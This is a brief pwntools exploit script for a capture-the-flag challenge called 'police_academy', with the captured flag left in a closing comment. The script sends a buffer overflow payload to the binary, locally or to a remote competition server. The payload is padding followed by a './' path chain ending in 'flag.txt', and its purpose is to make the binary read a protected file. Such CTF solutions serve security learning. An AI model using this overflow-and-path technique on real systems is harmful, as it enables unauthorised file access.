from pwn import *
import time
import sys

def police_academy(DEBUG):
	t = 0.3
	
	if DEBUG=="1":
		t = 0.005
		r = process("./police_academy")
		raw_input("debug?")
	elif DEBUG=="2":
		HOST = '128.199.224.175'
		PORT = 13000
		r = remote(HOST,PORT)
	
	payload = "kaiokenx20\x00"
	payload += "A"*(0x10-len(payload))
	payload += "./"*((0x24-8)/2)
	payload += "flag.txt"
	r.sendline(payload)
	r.sendline("8")
	r.interactive()

police_academy(sys.argv[1])
# pctf{bUff3r-0v3Rfl0wS`4r3.alw4ys-4_cl4SsiC}